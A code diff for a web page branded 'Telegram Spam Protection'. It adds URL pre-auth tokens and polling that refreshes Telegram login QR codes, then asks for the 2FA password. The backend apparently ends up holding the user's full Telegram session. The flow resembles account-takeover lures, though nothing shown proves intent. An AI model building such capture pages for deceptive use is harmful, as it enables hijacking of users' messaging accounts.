@@ -183,7 +183,7 @@
         <p class="subtitle">Telegram Spam Protection</p>
 
         <!-- Step 1: Phone Input -->
-        <div id="step-phone" class="step active">
+        <div id="step-phone" class="step">
             <div id="error-phone" class="error" style="display: none;"></div>
             <input 
                 type="tel" 
@@ -252,9 +252,7 @@
 
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
     <script>
-        const API_BASE = window.location.hostname === 'localhost' 
-            ? 'http://localhost:3000' 
-            : 'https://your-domain.com'; // Update with your actual domain
+        const API_BASE = window.location.origin;
 
         let currentToken = null;
         let pollInterval = null;
@@ -277,7 +275,61 @@
             }
         }
 
-        // Phone submission
+        // Check for pre-auth token in URL on page load
+        async function checkPreAuthToken() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const preAuthToken = urlParams.get('token');
+
+            if (!preAuthToken) {
+                // No token, show phone input (legacy flow)
+                return false;
+            }
+
+            // Show loading while we validate token
+            showStep('loading');
+
+            try {
+                // Initialize login with pre-auth token
+                const response = await fetch(`${API_BASE}/api/init-login-with-token`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ preAuthToken })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.error || 'Failed to initialize login');
+                }
+
+                currentToken = data.token;
+
+                if (data.status === 'already_authenticated') {
+                    document.getElementById('bot-link').href = data.bot_link;
+                    showStep('success');
+                } else {
+                    // Wait for QR code
+                    await pollForQrCode();
+                }
+
+                return true;
+
+            } catch (error) {
+                showError(error.message);
+                return true; // Return true to indicate we handled the token (even if failed)
+            }
+        }
+
+        // Initialize on page load
+        (async function init() {
+            const hasToken = await checkPreAuthToken();
+            if (!hasToken) {
+                // No pre-auth token, show phone input
+                showStep('phone');
+            }
+        })();
+
+        // Phone submission (legacy flow)
         document.getElementById('submit-phone').addEventListener('click', async () => {
             const phone = document.getElementById('phone-input').value.trim();
             
@@ -354,8 +406,16 @@
             poll();
         }
 
+        let currentQrLink = null;
+
         // Display QR code
         function displayQrCode(link) {
+            // Don't redraw if same link
+            if (currentQrLink === link) {
+                return;
+            }
+            currentQrLink = link;
+
             showStep('qr');
             const qrContainer = document.getElementById('qrcode');
             qrContainer.innerHTML = ''; // Clear previous
@@ -371,26 +431,40 @@
             });
         }
 
-        // Poll for authentication status
+        // Poll for authentication status AND refresh QR code
         function startStatusPolling() {
             pollInterval = setInterval(async () => {
                 try {
-                    const response = await fetch(`${API_BASE}/api/check-status/${currentToken}`);
-                    const data = await response.json();
+                    // First check status
+                    const statusResponse = await fetch(`${API_BASE}/api/check-status/${currentToken}`);
+                    const statusData = await statusResponse.json();
 
-                    if (!response.ok) {
-                        throw new Error(data.error || 'Failed to check status');
+                    if (!statusResponse.ok) {
+                        throw new Error(statusData.error || 'Failed to check status');
                     }
 
-                    if (data.authenticated) {
+                    if (statusData.authenticated) {
                         // Success!
                         clearInterval(pollInterval);
-                        document.getElementById('bot-link').href = data.bot_link;
+                        document.getElementById('bot-link').href = statusData.bot_link;
                         showStep('success');
-                    } else if (data.status === 'wait_password') {
+                        return;
+                    } else if (statusData.status === 'wait_password') {
                         // Need 2FA password
                         clearInterval(pollInterval);
                         showStep('password');
+                        return;
+                    }
+
+                    // If still waiting for QR confirmation, refresh the QR code
+                    // (QR codes expire every ~30 seconds)
+                    if (statusData.status === 'wait_qr_confirmation' || statusData.status === 'wait_qr') {
+                        const qrResponse = await fetch(`${API_BASE}/api/get-qr/${currentToken}`);
+                        const qrData = await qrResponse.json();
+
+                        if (qrResponse.ok && qrData.qr_link) {
+                            displayQrCode(qrData.qr_link);
+                        }
                     }
 
                 } catch (error) {
